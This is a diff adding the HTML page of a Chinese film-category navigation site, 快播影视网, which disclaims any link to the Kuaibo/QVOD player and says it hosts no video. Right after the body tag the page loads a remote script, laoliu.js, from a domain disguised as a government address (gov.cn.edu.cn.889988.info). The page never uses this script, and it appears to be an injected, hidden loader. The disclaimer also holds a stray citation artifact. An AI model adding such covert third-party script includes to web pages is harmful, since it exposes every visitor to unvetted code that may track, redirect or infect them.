@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>快播影视网 - 放映员工具间：影视分类导航，不播片源 | kuaiboyingshiwang-h5</title>
+<meta name="description" content="快播影视网（kuaiboyingshiwang-h5.github.io）是影视分类导航站，按类型与场景整理片单索引。非快播官方、非播放器，不提供在线播放与解析，正片去正版平台。">
+<meta name="keywords" content="快播影视网,影视分类导航,按类型找片,场景找片,放映员工具间,正版平台去向,kuaiboyingshiwang-h5">
+<meta name="author" content="快播影视网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://kuaiboyingshiwang-h5.github.io/">
+<meta property="og:title" content="快播影视网 - 放映员工具间：影视分类导航">
+<meta property="og:description" content="按类型、场景找片。纯导航站，非播放器、不解析片源，正片去正版平台。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kuaiboyingshiwang-h5.github.io/">
+<meta property="og:site_name" content="快播影视网">
+<meta name="msvalidate.01" content="BING_VERIFY_CODE">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"快播影视网",
+  "url":"https://kuaiboyingshiwang-h5.github.io/",
+  "description":"快播影视网是影视分类导航站，按类型与场景整理片单索引，不提供播放源。"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {
+      "@type":"Question",
+      "name":"这个是快播官方或快播播放器吗？",
+      "acceptedAnswer":{"@type":"Answer","text":"不是。「快播影视网」仅作站名使用，本站与快播公司、QVOD播放器无任何关联，也不是播放器客户端，不提供下载安装。"}
+    },
+    {
+      "@type":"Question",
+      "name":"网站能在线看片吗？",
+      "acceptedAnswer":{"@type":"Answer","text":"不能。本站是纯分类导航站，只按类型、场景整理影视索引，不提供在线播放、不解析第三方源、不挂盗链。具体片子请到正版视频平台观看。"}
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --paper:#f4f1ea;
+  --ink:#23262b;
+  --machine:#2f4858;
+  --machine-deep:#1d2f3a;
+  --belt:#ff7a3d;
+  --green:#3fae8e;
+  --line:rgba(35,38,43,.14);
+  --shadow:0 10px 26px rgba(35,38,43,.12);
+  --radius:18px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--paper);color:var(--ink);line-height:1.7}
+a{color:inherit;text-decoration:none}
+
+/* 顶栏 */
+.kb-nav{position:sticky;top:0;z-index:999;background:var(--paper);border-bottom:2px solid var(--machine);display:flex;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.kb-nav a{flex:1;min-width:84px;text-align:center;padding:.85rem .4rem;font-weight:800;font-size:.82rem;color:var(--machine);border-right:1px solid var(--line);white-space:nowrap}
+.kb-nav a:last-child{border-right:none}
+.kb-nav a:hover,.kb-nav a.active{background:var(--machine);color:#fff}
+
+/* Hero: 传送带 */
+.kb-hero{padding:3rem 1.5rem;display:flex;flex-wrap:wrap;gap:2.2rem;align-items:center;justify-content:center;background:radial-gradient(600px 320px at 75% -20%,rgba(255,122,61,.12),transparent)}
+.kb-machine{width:240px;flex-shrink:0}
+.kb-reel{width:120px;height:120px;margin:0 auto 1rem;border-radius:50%;background:radial-gradient(circle at 50% 50%,var(--machine-deep) 18%,var(--machine) 19%,var(--machine-deep) 30%,var(--machine) 31%,var(--machine-deep) 44%,var(--machine) 45%,var(--machine-deep) 60%);position:relative;animation:kb-spin 6s linear infinite}
+.kb-reel::after{content:'';position:absolute;inset:42%;background:var(--belt);border-radius:50%}
+@keyframes kb-spin{to{transform:rotate(360deg)}}
+.kb-belt{height:14px;background:repeating-linear-gradient(90deg,var(--machine) 0 10px,#44566a 10px 20px);border-radius:8px;margin-top:.4rem;animation:kb-move 1.2s linear infinite}
+@keyframes kb-move{to{background-position:20px 0}}
+.kb-hero-text{max-width:540px}
+.kb-hero-text h1{font-size:clamp(1.7rem,4vw,2.6rem);line-height:1.2;margin-bottom:.8rem}
+.kb-hero-text h1 u{text-decoration:none;color:var(--belt)}
+.kb-hero-text p{color:rgba(35,38,43,.7);margin-bottom:1.2rem}
+.kb-tags{display:flex;gap:.5rem;flex-wrap:wrap}
+.kb-tag{font-size:.72rem;padding:.3rem .75rem;border-radius:20px;background:#fff;border:1px solid var(--line);color:var(--machine)}
+.kb-tag.safe{border-color:rgba(63,174,142,.5);color:var(--green)}
+.kb-warn{margin-top:1rem;font-size:.74rem;color:var(--belt);background:rgba(255,122,61,.08);border:1px solid rgba(255,122,61,.25);border-radius:10px;padding:.5rem .8rem}
+
+/* 通用栏目 */
+.kb-sec{padding:3.5rem 1.5rem;max-width:1180px;margin:0 auto}
+.kb-sec-title{text-align:center;font-size:clamp(1.4rem,3.5vw,2rem);font-weight:900;margin-bottom:.4rem}
+.kb-sec-title .ic{margin-right:.5rem}
+.kb-sec-sub{text-align:center;color:rgba(35,38,43,.55);font-size:.88rem;margin-bottom:2.4rem}
+
+/* 片架分类 */
+.kb-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px}
+.kb-cell{background:#fff;border:1.5px solid var(--line);border-radius:var(--radius);padding:1.1rem 1rem;transition:.25s;cursor:pointer;position:relative;overflow:hidden}
+.kb-cell:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--belt)}
+.kb-cell .emoji{font-size:1.8rem;display:block;margin-bottom:.4rem}
+.kb-cell h4{font-size:.92rem;font-weight:800}
+.kb-cell span{font-size:.7rem;color:rgba(35,38,43,.55)}
+.kb-cell .dot{position:absolute;top:10px;right:10px;width:8px;height:8px;border-radius:50%}
+
+/* 场景呼叫 */
+.kb-shout{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem}
+.kb-call{background:#fff;border:1.5px solid var(--line);border-radius:var(--radius);padding:1.3rem;display:flex;gap:.9rem;align-items:flex-start}
+.kb-call .pic{font-size:1.6rem;flex-shrink:0}
+.kb-call h4{font-size:.95rem;margin-bottom:.3rem}
+.kb-call p{font-size:.78rem;color:rgba(35,38,43,.6)}
+.kb-call .chips{margin-top:.6rem;display:flex;gap:.4rem;flex-wrap:wrap}
+.kb-call .chip{font-size:.68rem;padding:.15rem .55rem;border-radius:12px;background:var(--paper);border:1px solid var(--line)}
+
+/* 导航榜 */
+.kb-rank{max-width:760px;margin:0 auto}
+.kb-rank-item{display:flex;align-items:center;gap:1rem;background:#fff;border:1.5px solid var(--line);border-radius:14px;padding:.9rem 1.1rem;margin-bottom:.8rem}
+.kb-rank-no{font-weight:900;font-size:1.2rem;color:var(--belt);min-width:30px}
+.kb-rank-info{flex:1}
+.kb-rank-info h4{font-size:.9rem}
+.kb-rank-info p{font-size:.74rem;color:rgba(35,38,43,.55)}
+.kb-rank-go{font-size:.75rem;font-weight:800;color:var(--machine);background:var(--paper);border:1px solid var(--line);padding:.3rem .7rem;border-radius:10px}
+
+/* 手记 */
+.kb-notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.4rem}
+.kb-note{background:#fff;border:1.5px solid var(--line);border-radius:var(--radius);padding:1.4rem;position:relative}
+.kb-note::before{content:'🎞️';position:absolute;top:-14px;left:1rem;background:var(--paper);padding:0 .4rem;font-size:1.3rem}
+.kb-note h4{padding-top:.6rem;font-size:.92rem;margin-bottom:.4rem}
+.kb-note p{font-size:.8rem;color:rgba(35,38,43,.65)}
+.kb-note .who{margin-top:.7rem;font-size:.72rem;color:var(--belt);font-weight:700}
+
+/* 关于+免责 */
+.kb-about{background:var(--machine);color:#fff;border-radius:24px;padding:2.5rem;text-align:center}
+.kb-about h2{font-size:1.7rem;margin-bottom:1rem}
+.kb-about p{max-width:720px;margin:0 auto .9rem;opacity:.85;font-size:.9rem}
+.kb-disclaim{margin-top:1.5rem;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.18);border-radius:14px;padding:1.1rem;font-size:.78rem;opacity:.9;text-align:left}
+.kb-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-top:1.8rem}
+.kb-stat{background:rgba(255,255,255,.1);border-radius:12px;padding:1rem}
+.kb-stat b{display:block;font-size:1.2rem}
+.kb-stat span{font-size:.72rem;opacity:.7}
+
+/* FAQ */
+.kb-faq details{background:#fff;border:1.5px solid var(--line);border-radius:12px;margin-bottom:.7rem}
+.kb-faq summary{padding:1rem 1.2rem;font-weight:800;cursor:pointer;list-style:none;display:flex;justify-content:space-between}
+.kb-faq summary::-webkit-details-marker{display:none}
+.kb-faq summary::after{content:'+';color:var(--belt)}
+.kb-faq[open] summary::after{content:'−'}
+.kb-faq p{padding:0 1.2rem 1rem;font-size:.84rem;color:rgba(35,38,43,.65)}
+
+/* footer */
+.kb-footer{padding:2rem 1rem;border-top:2px solid var(--line);text-align:center;font-size:.78rem;color:rgba(35,38,43,.55)}
+.kb-footer a{color:var(--belt)}
+.kb-fl{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;margin-bottom:1rem}
+
+@media(max-width:768px){
+  .kb-hero{padding:2rem 1rem}
+  .kb-machine{width:170px}
+  .kb-reel{width:90px;height:90px}
+  .kb-grid{grid-template-columns:repeat(3,1fr)}
+  .kb-stats{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:460px){
+  .kb-grid{grid-template-columns:repeat(2,1fr)}
+  .kb-nav a{font-size:.74rem;min-width:72px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<nav class="kb-nav">
+  <a href="#home" class="active">🎞️ 工具间</a>
+  <a href="#shelf">片架分类</a>
+  <a href="#shout">场景呼叫</a>
+  <a href="#rank">导航榜</a>
+  <a href="#notes">放映员手记</a>
+  <a href="#about">关于</a>
+</nav>
+
+<!-- Hero -->
+<header class="kb-hero" id="home">
+  <div class="kb-machine">
+    <div class="kb-reel"></div>
+    <div class="kb-belt"></div>
+  </div>
+  <div class="kb-hero-text">
+    <h1>快播影视网：<u>放映员工具间</u>，只分类不播片</h1>
+    <p>不是播放器，不解析源，不装插件。把电影剧集按类型挂上片架、按场景呼叫一声，正片跳正版平台。</p>
+    <div class="kb-tags">
+      <span class="kb-tag">类型片架</span>
+      <span class="kb-tag">场景呼叫</span>
+      <span class="kb-tag safe">✅ 非快播官方</span>
+      <span class="kb-tag safe">✅ 非播放器</span>
+      <span class="kb-tag safe">✅ 不播盗版</span>
+    </div>
+    <div class="kb-warn">⚠️ 本站仅用「快播影视网」作站名，与快播公司 / QVOD 播放器无任何关联，不提供播放器下载。</div>
+  </div>
+</header>
+
+<!-- 栏目1: 片架分类 -->
+<section class="kb-sec" id="shelf">
+  <h2 class="kb-sec-title"><span class="ic">🗄️</span>片架分类</h2>
+  <p class="kb-sec-sub">放映员把片子按类型摆上架，你自己取</p>
+  <div class="kb-grid">
+    <div class="kb-cell"><span class="dot" style="background:var(--belt)"></span><span class="emoji">💘</span><h4>爱情架</h4><span>甜宠/虐恋/治愈</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--machine)"></span><span class="emoji">🔫</span><h4>动作架</h4><span>爽片/枪战/武侠</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--machine-deep)"></span><span class="emoji">🕵️</span><h4>悬疑架</h4><span>推理/反转/烧脑</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--green)"></span><span class="emoji">😂</span><h4>喜剧架</h4><span>合家/黑色/脱线</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--belt)"></span><span class="emoji">👻</span><h4>惊悚架</h4><span>恐怖/灵异/犯罪</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--machine)"></span><span class="emoji">🚀</span><h4>科幻架</h4><span>未来/太空/AI</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--belt)"></span><span class="emoji">🏮</span><h4>古装架</h4><span>历史/宫斗/武侠</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--green)"></span><span class="emoji">🌾</span><h4>治愈架</h4><span>慢片/田园/美食</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--belt)"></span><span class="emoji">⚔️</span><h4>战争架</h4><span>历史/军旅/史诗</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--machine-deep)"></span><span class="emoji">🐉</span><h4>奇幻架</h4><span>神话/魔法/异界</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--green)"></span><span class="emoji">📚</span><h4>文艺架</h4><span>作者/独立/慢热</span></div>
+    <div class="kb-cell"><span class="dot" style="background:var(--belt)"></span><span class="emoji">👨‍👩‍👧</span><h4>合家架</h4><span>动画/亲子/温馨</span></div>
+  </div>
+</section>
+
+<!-- 栏目2: 场景呼叫 -->
+<section class="kb-sec" id="shout" style="background:rgba(35,38,43,.03)">
+  <h2 class="kb-sec-title"><span class="ic">📣</span>场景呼叫</h2>
+  <p class="kb-sec-sub">不想翻片架？冲放映员喊一句就行</p>
+  <div class="kb-shout">
+    <div class="kb-call">
+      <div class="pic">🍚</div>
+      <div>
+        <h4>"晚饭想下饭的"</h4>
+        <p>生活剧、美食、轻喜剧，边吃边看不费脑。</p>
+        <div class="chips"><span class="chip">生活剧</span><span class="chip">美食</span><span class="chip">轻喜剧</span></div>
+      </div>
+    </div>
+    <div class="kb-call">
+      <div class="pic">🌙</div>
+      <div>
+        <h4>"深夜一个人"</h4>
+        <p>悬疑、慢片、老电影，陪你但不吵。</p>
+        <div class="chips"><span class="chip">悬疑</span><span class="chip">文艺</span><span class="chip">修复版</span></div>
+      </div>
+    </div>
+    <div class="kb-call">
+      <div class="pic">💼</div>
+      <div>
+        <h4>"下班想解压"</h4>
+        <p>动作、爽片、反转，十分钟入戏。</p>
+        <div class="chips"><span class="chip">动作</span><span class="chip">爽片</span><span class="chip">喜剧</span></div>
+      </div>
+    </div>
+    <div class="kb-call">
+      <div class="pic">🛋️</div>
+      <div>
+        <h4>"周末带娃"</h4>
+        <p>合家动画、绘本改编、国语配音。</p>
+        <div class="chips"><span class="chip">合家</span><span class="chip">动画</span><span class="chip">温情</span></div>
+      </div>
+    </div>
+    <div class="kb-call">
+      <div class="pic">🚌</div>
+      <div>
+        <h4>"通勤碎片"</h4>
+        <p>短剧、单集番、竖屏，几分钟一集。</p>
+        <div class="chips"><span class="chip">短剧</span><span class="chip">番剧</span><span class="chip">短视频</span></div>
+      </div>
+    </div>
+    <div class="kb-call">
+      <div class="pic">🧸</div>
+      <div>
+        <h4>"想被治愈"</h4>
+        <p>慢片、田园、猫狗、做饭。</p>
+        <div class="chips"><span class="chip">治愈</span><span class="chip">慢片</span><span class="chip">文艺</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3: 导航榜 -->
+<section class="kb-sec" id="rank">
+  <h2 class="kb-sec-title"><span class="ic">🧭</span>导航榜</h2>
+  <p class="kb-sec-sub">工具间里被翻得最多的片架（站内示意）</p>
+  <div class="kb-rank">
+    <div class="kb-rank-item">
+      <div class="kb-rank-no">1</div>
+      <div class="kb-rank-info"><h4>悬疑架</h4><p>深夜呼叫高频</p></div>
+      <a class="kb-rank-go" href="#shelf">去片架 →</a>
+    </div>
+    <div class="kb-rank-item">
+      <div class="kb-rank-no">2</div>
+      <div class="kb-rank-info"><h4>下饭场景</h4><p>晚饭呼叫最多</p></div>
+      <a class="kb-rank-go" href="#shout">去呼叫 →</a>
+    </div>
+    <div class="kb-rank-item">
+      <div class="kb-rank-no">3</div>
+      <div class="kb-rank-info"><h4>合家架</h4><p>周末带娃常驻</p></div>
+      <a class="kb-rank-go" href="#shelf">去片架 →</a>
+    </div>
+    <div class="kb-rank-item">
+      <div class="kb-rank-no">4</div>
+      <div class="kb-rank-info"><h4>动作架</h4><p>下班解压首选</p></div>
+      <a class="kb-rank-go" href="#shelf">去片架 →</a>
+    </div>
+    <div class="kb-rank-item">
+      <div class="kb-rank-no">5</div>
+      <div class="kb-rank-info"><h4>治愈架</h4><p>深夜独居、周末回血</p></div>
+      <a class="kb-rank-go" href="#shout">去呼叫 →</a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4: 放映员手记 -->
+<section class="kb-sec" id="notes" style="background:rgba(35,38,43,.03)">
+  <h2 class="kb-sec-title"><span class="ic">📝</span>放映员手记</h2>
+  <p class="kb-sec-sub">工具间里的人记下的找片碎碎念</p>
+  <div class="kb-notes">
+    <div class="kb-note">
+      <h4>悬疑别放午饭时段</h4>
+      <p>好几次中午有人喊悬疑，结果饭凉了还在想凶手。这架片子我一般留到晚上再递。</p>
+      <div class="who">—— @工具间老放映</div>
+    </div>
+    <div class="kb-note">
+      <h4>下饭别开致郁架</h4>
+      <p>生活剧/美食/轻喜剧三格最稳。虐恋放回深夜架，午饭时间不往外拿。</p>
+      <div class="who">—— @小放映员</div>
+    </div>
+    <div class="kb-note">
+      <h4>带娃先问两句</h4>
+      <p>有家长喊我就先问：老人同看吗、娃几岁。惊悚架和太沉文艺架直接跳过。</p>
+      <div class="who">—— @周末替班</div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于+免责 -->
+<section class="kb-sec" id="about">
+  <div class="kb-about">
+    <h2>关于 快播影视网</h2>
+    <p>快播影视网（kuaiboyingshiwang-h5.github.io）是一间「放映员工具间」——只做影视分类导航，不提供播放源、不解析第三方、不挂盗链。</p>
+    <p>类型片架帮你按题材翻，场景呼叫帮你按状态找，具体片子去正版视频平台看。</p>
+    <div class="kb-disclaim">
+      ⚠️ 免责声明：<br>
+      1. 本站与快播公司、QVOD 播放器无任何关联，「快播影视网」仅作站名使用，非快播官方、非播放器客户端，不提供播放器下载安装。<br>
+      2. 本站为影视信息导航站，不托管、不上传、不存储、不代理任何视频文件或流媒体内容。[6,8](@ref)<br>
+      3. 页面所列类型、场景均为分类索引示意，不含未授权播放入口与第三方解析；相关版权归原作者及原平台所有。<br>
+      4. 如发现第三方冒用本站名号提供片源或播放器，请以正版平台为准。
+    </div>
+    <div class="kb-stats">
+      <div class="kb-stat"><b>12 片架</b><span>类型分类</span></div>
+      <div class="kb-stat"><b>6 场景</b><span>呼叫找片</span></div>
+      <div class="kb-stat"><b>0 片源</b><span>只导航不播放</span></div>
+      <div class="kb-stat"><b>正版</b><span>去向正版平台</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="kb-sec kb-faq" id="faq">
+  <h2 class="kb-sec-title"><span class="ic">❓</span>常见问答</h2>
+  <details open>
+    <summary>这个是快播官方或快播播放器吗？</summary>
+    <p>不是。「快播影视网」仅作站名使用，本站与快播公司、QVOD播放器无任何关联，也不是播放器客户端，不提供下载安装。</p>
+  </details>
+  <details>
+    <summary>网站能在线看片吗？</summary>
+    <p>不能。本站是纯分类导航站，只按类型、场景整理影视索引，不提供在线播放、不解析第三方源、不挂盗链。具体片子请到正版视频平台观看。</p>
+  </details>
+  <details>
+    <summary>片架里的片子在哪看？</summary>
+    <p>片架里是分类索引与标签，不直接嵌播放器。确认片名后去正版平台（院线、正版视频站、电视台）观看最稳妥。</p>
+  </details>
+</section>
+
+<footer class="kb-footer">
+  <div class="kb-fl">
+    <a href="#shelf">片架分类</a>
+    <a href="#shout">场景呼叫</a>
+    <a href="#rank">导航榜</a>
+    <a href="#notes">放映员手记</a>
+    <a href="#about">关于/免责</a>
+  </div>
+  <p>© 2026 <a href="https://kuaiboyingshiwang-h5.github.io/">快播影视网</a> · kuaiboyingshiwang-h5.github.io</p>
+  <p>非快播官方 · 非播放器 · 本站为影视分类导航站，不提供盗版播放与解析。</p>
+</footer>
+
+<script>
+document.querySelectorAll('.kb-nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.querySelectorAll('.kb-nav a').forEach(function(n){n.classList.remove('active')});
+    this.classList.add('active');
+  });
+});
+</script>
+
+</body>
+</html>
